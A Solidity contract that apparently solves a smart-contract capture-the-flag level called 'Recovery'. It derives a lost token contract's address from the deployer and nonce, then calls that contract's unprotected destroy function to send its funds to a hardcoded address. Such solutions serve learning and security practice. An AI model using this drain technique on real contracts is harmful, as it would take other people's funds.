// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract RecoverySolver {

    function solve(address target) external {
        //computing the address with the nonce = 1, cause it's the first token for this contract 
        //contracts start with nonce = 1
        bytes1 nonce = 0x01;
        address tokenAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            target,
                            bytes1(nonce)
                        )
                    )
                )
            )
        );

        Token(tokenAddress).destroy(payable(address(0x7bfCc9097b2D2cEbAB6c0CF22f0c9705eb9Cb929)));
    }
}

interface Token {
  function destroy(address payable _to) external;
  }
